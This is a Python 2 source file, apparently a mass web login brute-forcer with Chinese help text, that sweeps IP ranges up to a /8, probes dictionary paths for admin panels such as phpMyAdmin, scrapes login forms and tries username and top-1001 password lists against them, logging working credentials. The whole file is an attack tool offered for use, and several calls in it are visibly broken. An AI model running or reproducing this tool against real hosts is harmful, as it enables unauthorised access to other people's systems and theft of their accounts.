#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import os
import sys
import argparse
from argparse import RawTextHelpFormatter
import time
import requests
import threading
from lxml import etree
from termcolor import *
import pyping
import signal
from multiprocessing import cpu_count
from multiprocessing import Pool

#def setArgs():

def valiteIp(subIpStr):
    tmp = subIpStr.split('.')
    if 4 != len(tmp):
        return False
    for i in tmp:
        if False == i.isdigit():
            return False

    return True

def genIpSubFromSlash(ipSubStr):
    result = []
    tmp = ipSubStr.split('.')[0:3] + ipSubStr.split('.')[3].split('/')
    for i in tmp:
        if False == i.isdigit():
            return result

    if '24' == tmp[4]:
        for i in range(1, 255, 1):
            ip = tmp[0] + '.' + tmp[1] + '.' + tmp[2] + '.' + str(i)
            result.append(ip)
    elif '16' == tmp[4]:
        for i in range(0, 255, 1):
            for j in range(1, 255, 1):
                ip = tmp[0] + '.' + tmp[1] + '.' + str(i) + '.' + str(j)
                result.append(ip)
    elif '8' == tmp[4]:
        for i in range(0, 255, 1):
            for j in range(0, 255, 1):
                for k in range(1, 255, 1):
                    ip = tmp[0] + '.' + str(i) + '.' + str(j) + '.' + str(k)
                    result.append(ip)
    else:
        return result
    return result

def genIpSubFromComma(subIpStr):
    result = []
    if None == subIpStr or '' == subIpStr:
        return result

    tmp = subIpStr.split(',')

    for i in tmp:
        if '/' in i:
            tmp1 = genIpSubFromSlash(i)
            if None == tmp1:
                continue
            else:
                result += tmp1
        elif '-' in i:
            tmp2 = genIpSubFromBar()
            if None == tmp2:
                continue
            else:
                result += tmp2
        elif True == valiteIp(i):
            result.append(i)
        else:
            continue
    return result



def genIpSubFromBar(ipSubStr):
    result = []
    tmp = ipSubStr.split('.')[0:3] + ipSubStr.split('.')[3].split('-') 
    #if 
    for i in tmp:
        if False == i.isdigit():
            return result

    for i in range(int(tmp[3]), (int(tmp[4]) + 1), 1):
        ip = tmp[0] + '.' + tmp[1] + '.' + tmp[2] + '.' + str(i)
        result.append(ip)

    return result
def genIpList(ipSubStr):
    return genIpSubFromComma(ipSubStr)

def isHostLiving(ip):
    try:
        resp = pyping.ping(ip)
        if 0 == resp.ret_code:
            sys.stdout.write(colored(ip + ' [living...].\n', 'green'))
            return True
        else:
            sys.stdout.write(colored(ip + ' [not-livig].\n', 'red'))
            return False
    except Exception, e:
        sys.stdout.write(str(e) + '\n')
        return False
        

def getLivingHosgt(iplist):
    result = []
    for ip in iplist:
        if True == isHostLiving(ip):
            result.append(ip)
    return result

def getDirList(dirs):
    result = []
    with open(dirs, 'r') as dirFile:
        dirLine = dirFile.readline().strip()
        while dirLine:
            result.append(dirLine)
            dirLine = dirFile.readline().strip()
        dirFile.close()
    return result

def isLoginSuccess(resp):
    if 128 > len(resp.text):
        return False

    actionUrl, cookies, userName, passwd, otherArgs = getLoginFormArgs(resp)
    if (None != actionUrl and '' != actionUrl) and (None != userName and '' != userName) and (None != passwd and '' != passwd):
        return False
    else:
        return True
#    sys.stdout.write('function isLoginSuccess...\n')
    #html = etree.HTML(resp.text)
    #options = html.xpath('//option')
    #if 100 < len(options):
    #    return True
    #else:
    #    if resp.headers:
    #        print resp.headers
    #    if resp.text is not None:
    #        print resp.text
    #    if resp.content is not None:
    #        print resp.content
    #    return False


    #return False


def login(loginThreadConfig, url, cookies, userName, passwd, otherArgs):
#    sys.stdout.write('function login...\n')
    header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'}
    
    with open(loginThreadConfig['users'], 'r') as usersFile, open(loginThreadConfig['passwds'], 'r') as passwdsFiles:
        uL = usersFile.readline().strip()
        pL = passwdsFiles.readline().strip()
        while uL:
            while pL:
                postData = {userName: uL, passwd: pL}
                tmp = postData.copy()
                tmp.update(otherArgs)
                postData = tmp

                resp = requests.post(url, headers = header, cookies = cookies ,data = postData)
                sys.stdout.write(colored('login:' + url + ' username:' + uL + ' passwd:' + pL + '\n', 'white'))
                if 200 == resp.status_code or 302 == resp.status_code:
                    if True == isLoginSuccess(resp):
                        sys.stdout.write(colored(url + ' [status_code:' + str(resp.status_code)+ '] [userName:' + uL + ' passwd:' + pL + ']''\n', 'green'))
                        with open(loginThreadConfig['out'], 'a+') as outFile:
                            outFile.writelines(url + '|' + uL + '|' + pL + '\n')
                            outFile.close()
                        if 'continue' == loginThreadConfig['fc']:
                            break
                        else:
                            return
                pL = passwdsFiles.readline().strip()

            uL = usersFile.readline().strip()
    usersFile.close()
    passwdsFiles.close()

    return

def getLoginFormArgs(resp):
#    sys.stdout.write('function getLoginFormArgs...\n')

    html = etree.HTML(resp.text)
     
    lang = ''
    tmp = html.xpath('//select[contains(@class, "lang")]/@lang')
    if 1 <= len(tmp):
        lang = tmp[0]

#    forms = html.xpath('//form[contains(@name,"login")]')

    actionUrl = ''
    tmp = html.xpath('//form[contains(@name,"login") or contains(@id, "login")]/@action')
    if 1 <= len(tmp):
        actionUrl = tmp[0]

    userName = ''
    tmp = html.xpath('//input[contains(@name, "username") or contains(@id, "username")]/@name')
    if 1 <= len(tmp):
        userName = tmp[0]

    passwd =  ''
    tmp = html.xpath('//input[contains(@name, "password") or contains(@id, "passwor")]/@name')
    if 1 <= len(tmp):
        passwd = tmp[0]

    otherInputs = html.xpath('//form[contains(@name,"login") or contains(@id, "login")]//input[contains(@type, "hidden")]')

    otherArgs = {}
    for i in otherInputs:
        otherArgs[i.xpath('./@name')[0]] = i.xpath('./@value')[0]

    if None != lang and '' != lang:
        otherArgs['lang'] = lang

#    sys.stdout.write('--->L184 actionUrl:' + actionUrl + ' userName:' +  userName + ' passwd:' + passwd + '\n')
#    sys.stdout.write(str(otherArgs) + '\n')
#    sys.stdout.write(str(resp.cookies) + '\n')

#    if None == otherArgs or 0 == len(otherArgs):
#        sys.stdout.write('otherArgs is None\n')
#    else:
#        sys.stdout.write(str(len(otherArgs) + '\n'))
#        sys.stdout.write(str(type(otherArgs) + '\n'))
#        
#    if None == resp.cookies or 0 == len(resp.cookies):
#        sys.stdout.write('resp.cookies is None\n')
#    else:
#        sys.stdout.write(str(len(resp.cookies) + '\n'))
#        sys.stdout.write(str(type(resp.cookies) + '\n'))


    return actionUrl, resp.cookies, userName, passwd, otherArgs

def bruteDir(ipLine, dirList, bruteDirThreadConfig):
    isHttp = False
    isHttps = False
    resp = ''
    url = ''
    urls = ''

    loginThreadConfig = {}
    loginThreadConfig['users'] = bruteDirThreadConfig['users']
    loginThreadConfig['passwds'] = bruteDirThreadConfig['passwds']
    loginThreadConfig['out'] = bruteDirThreadConfig['out']
    loginThreadConfig['fc'] = bruteDirThreadConfig['fc']

    if False == isHostLiving(ipLine):
        return

    for dirItem in dirList:
        
        if '/' != dirItem[0]: 
            url = 'http://' + ipLine + '/' + dirItem
        else:
            url = 'http://' + ipLine + dirItem 
        
        if '/' != url[-1]:
            url = url + '/'

        try:
            resp = requests.get(url, timeout = (3, 15))
            if 200 == resp.status_code:
                with open(bruteDirThreadConfig['surl'], 'a') as surlFile:
                    surlFile.writelines(url + '\n')
                    surlFile.close()
                sys.stdout.write(colored(url + " [status_code:" + str(resp.status_code) + ']\n', 'green'))
                isHttp = True
                isHttps = False
                try:
                    actionUrl, cookies, userName, passwd, otherArgs = getLoginFormArgs(resp)
                    #sys.stdout.write('--->Line232\n')
                    if (None != actionUrl and '' != actionUrl) and (None != userName and '' != userName) and (None != passwd and '' != passwd):
                        if 'http://' != actionUrl[0:7]:
                            if '/' != actionUrl[0]:
                                actionUrl = url + '/' + actionUrl
                            else:
                                actionUrl = url + actionUrl
                        
                        t = threading.Thread(target=login, args=(loginThreadConfig, actionUrl, cookies, userName, passwd, otherArgs, ))
                        t.setDaemon(True)
                        t.start()
                        t.join()

                        #login(actionUrl, cookies, userName, passwd, otherArgs)
                    else:
                        sys.stdout.write('--->Line238 actionUrl: ' + actionUrl + ' userName: ' +  userName + ' passwd: '+ passwd + '\n')
                except Exception, e:
                    sys.stdout.write(str(e) + '\n')
                break

            else:
                sys.stdout.write(colored(url + " [status_code:" + str(resp.status_code) + ']\n', 'yellow'))

        except Exception, e:
            sys.stdout.write(colored(url + ' [connect-error]\n', 'red'))
        
        if '/' != dirItem[0]: 
            urls = 'https://' + ipLine + '/' + dirItem
        else:
            urls = 'https://' + ipLine + dirItem
        
        if '/' != urls[-1]:
            urls = urls + '/'
        
        try:
            resp = requests.get(urls)
            if 200 == resp.status_code:
                with open(bruteDirThreadConfig['surl'], 'a') as surlFile:
                    surlFile.writelines(urls + '\n')
                    surlFile.close()
                sys.stdout.write(colored(urls + " [status_code:" + str(resp.status_code) + ']\n', 'green'))
                isHttp = False
                isHttps = True
                try:
                    actionUrl, cookies, userName, passwd, otherArgs = getLoginFormArgs(resp)
                    if (None != actionUrl and '' != actionUrl) and (None != userName and '' != userName) and (None != passwd and '' != passwd):
                        if 'http://' != actionUrl[0:7]:
                            if '/' != actionUrl[0]:
                                actionUrl = urls + '/' + actionUrl
                            else:
                                actionUrl = urls + actionUrl
                        t = threading.Thread(loginThreadConfig, target=login, args=(actionUrl, cookies, userName, passwd, otherArgs, ))
                        t.setDaemon(True)
                        t.start()
                        t.join()
                        login(actionUrl, cookies, userName, passwd, otherArgs)
                except Exception, e:
                    sys.stdout.write(str(e) + '\n')
                break
            else:
                sys.stdout.write(colored(urls + " [status_code:" + str(resp.status_code) + ']\n', 'yellow'))

        except Exception, e:
            sys.stdout.write(colored(urls + ' [connect-error] ' + str(e) + '\n', 'red'))

        url = ''
        urls = ''
    
    return

def quit(signum, frame):
    sys.stdout.write(colored('Stop!\n','red'))
    sys.exit()

def subWorkers(cpuCnt, subIpList, dirList, bruteDirThreadConfig):
    signal.signal(signal.SIGINT, quit)
    signal.signal(signal.SIGTERM, quit)
#    threads = []
#    for ipLine in subIpList:
#        try:
#            t = threading.Thread(target=bruteDir, args=(ipLine, dirList, bruteDirThreadConfig, ))
#            threads.append(t)
#        except Exception, e:
#            sys.stdout.write(str(e) + '\n')
#
#    try:
#        for thread in threads:
##            thread.setDaemon(True)
#            thread.start()
#            thread.join()
#            #time.sleep(1)
##        while True:
##            pass
#
#    except Exception, e:
#        sys.stdout.write(str(e) + '\n')
#    return

    times = len(subIpList) / cpuCnt
    lastTimeCnt = len(subIpList) % cpuCnt

    

    if 0 < lastTimeCnt:
        times += 1

    for i in range(times):
        if (times - 1) != i:
            for c in range(cpuCnt):
                try:
                    ipLine = subIpList.pop(0)
                    thread = threading.Thread(target=bruteDir, args=(ipLine, dirList, bruteDirThreadConfig, ))
                    thread.setDaemon(True)
                    thread.start()
                    thread.join()
                except Exception, e:
                    sys.stdout.write(str(e) + '\n')
        else:
            for t in range(lastTimeCnt):
                try:
                    ipLine = subIpList.pop(0)
                    thread = threading.Thread(target=bruteDir, args=(ipLine, dirList, bruteDirThreadConfig, ))
                    thread.setDaemon(True)
                    thread.start()
                    thread.join()
                except Exception, e:
                    sys.stdout.write(str(e) + '\n')

    return


if __name__ == '__main__':
    
    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter, description='使用说明')
    parser.add_argument('-ipsf', help='指定目标ip 目标域名 目标ip:端口 目标域名:端口记录文件')
    parser.add_argument('-ipsb', help='指定目标ip段（如:1.2.3.4/24 或者 1.2.3.4-200）')

    parser.add_argument('-dirs', default = "configs/dirs-lists/dir-list.txt",
                                    help='爆破路径的字典文件.(默认: config/dirs-lists/comment-dirs.txt)')

    parser.add_argument('-users', default = "configs/users-lists/users-list.txt",
                                    help='指定爆破登录时所用的用户名字典文件(默认: config/users-list/comment-users.txt)')

    parser.add_argument('-passwds', default = "configs/passwds-lists/top1001-password.txt",
                                    help='指定爆破登录时所使用的密码字典文件.(默认: config/passwds-lists/comment-passwds.txt)')

    parser.add_argument('-proxy', default = "http://127.0.0.1:8118",
                                    help='指定代理地址，不使用代理请指定参数为n. (默认: http://127.0.0.1:8118)')

    parser.add_argument('-success', default = "configs/success-list/comment-success.txt",
                                    help='指定爆破登录成功时出现的一些特殊字符字典文件.(默认: comment-success.txt)')

    parser.add_argument('-failed', default = "configs/failed-lists/comment-failed.txt",
                                    help='指定爆破登录时失败时出现的一些特征字符字典文件.(默认: comment-failed.txt)')

    parser.add_argument('-out', default = "url-user-passwd-pair.txt",
                                    help='指定爆破登录成功后将登录URL和对应的用户名以及密码保存到文件.(默认:url-user-passwd-pair.txt)')

    parser.add_argument('-surl', default = "success-urls.txt",
                                    help='指定保存在phpMyAdmin后台登陆的URL的文件.(默认: success-urls.txt)')

    logfile = "logs/" + time.strftime("%Y-%m-%d-%H:%M:%S", time.localtime()) + "-log.txt"
    parser.add_argument('-logfile', default = logfile,
                                    help='指定保存日志的文件，不使用日志文件而时输出到终端的指定参数为n.(默认: log.txt)')

    parser.add_argument('-ca', default = 'y',
                                    help='指定是否输出最终执行时的参数.[y/Y, n/N] y或者Y输出，否则不输出. (默认: y)')

    parser.add_argument('-fc', default='exit', choices=['exit', 'continue'],
                                    help='指定是否在爆破出一个用户名密码对之后就立即停止该ip的爆破')
#    parser.add_argument('-statCode', help='指定成功返回登录界面的状态码参数. (默认: 200)')
#    parser.add_argument('-StatCode', help='指定成功返回登录界面时的状态码文件。 (默认: 无)')

    args = parser.parse_args()

    ipsf = ''
    ipList = []

#    dirs = "configs/dirs-lists/dir-list.txt"
#    users = "configs/users-lists/users-list.txt"
#    passwds = "configs/passwds-lists/top1001-password.txt"
#    proxy = "http://127.0.0.1:8118"
#    success = "configs/success-list/comment-success.txt"
#    failed = "configs/failed-lists/comment-failed.txt"
#    out = "default-res.txt"
#    surl = "success-urls.txt"
#    ca = 'y'
#    statCode = '200,301'
#    StatCode = ''


    if args.ipsf is None and args.ipsb is None:
        print "至少给定ipsf（用以指定ip列表文件）或者ipsb（参数用以指定ip地址段）"
        parser.print_help()
        sys.exit()
    elif args.ipsb is not None and args.ipsf is not None:
        print "不能同时指定ipsf参数和ipsb参数"
        parser.print_help()
        sys.exit()
    elif args.ipsb is None and args.ipsf is not None:
        ipsf = args.ipsf
        with open(ipsf, 'r') as ipsfFile:
            ipLine = ipsfFile.readline().strip()
            while ipLine:
                ipList.append(ipLine)
                ipLine = ipsfFile.readline().strip()
            ipsfFile.close()
    else:
        ipsb = args.ipsb
        ipList = genIpList(ipsb)

#    if args.dirs:
#        dirs = args.dirs
#
#    if args.users:
#        users =args.users
#
#    if args.passwds:
#        passwds = args.passwds
#
#    if args.proxy:
#        proxy = args.proxy
#
#    if args.success:
#        success = args.success
#
#    if args.failed:
#        failed = args.failed
#
#    if args.out:
#        out = args.out
#
#    if args.surl:
#        surl = args.surl
#
#    if args.logfile:
#       logfile = args.logfile
#
#    if args.ca:
#        ca = args.ca

#    if args.statCode:
#        statCode = args.statCode
#
#    if args.StatCode:
#        StatCode = args.StatCode

    dirList = getDirList(args.dirs)
    
    signal.signal(signal.SIGINT, quit)
    signal.signal(signal.SIGTERM, quit)

    cpuCnt = cpu_count()
    pool = Pool(cpuCnt)
    eachProJobCnt = len(ipList) / cpuCnt
    lastProJobCnt = (len(ipList) / cpuCnt) + (len(ipList) % cpuCnt)
    
    bruteDirThreadConfig = {}
    bruteDirThreadConfig['dirs'] = args.dirs
    bruteDirThreadConfig['users'] = args.users
    bruteDirThreadConfig['passwds'] = args.passwds
    bruteDirThreadConfig['surl'] = args.surl
    bruteDirThreadConfig['fc'] = args.fc
    bruteDirThreadConfig['out'] = args.out
    
    for cpuIndex in range(cpuCnt):
        subIpList = []
        if (cpuCnt - 1) != cpuIndex:
            for i in range(eachProJobCnt):
               subIpList.append(ipList.pop(0))

            pool.apply_async(subWorkers, args=(cpuCnt, subIpList, dirList, bruteDirThreadConfig, ))
            
        else:
            for i in range(lastProJobCnt):
               subIpList.append(ipList.pop(0))

            pool.apply_async(subWorkers, args=(subIpList, dirList, bruteDirThreadConfig, ))

    pool.close()
    pool.join()
#    while True:
#        pass
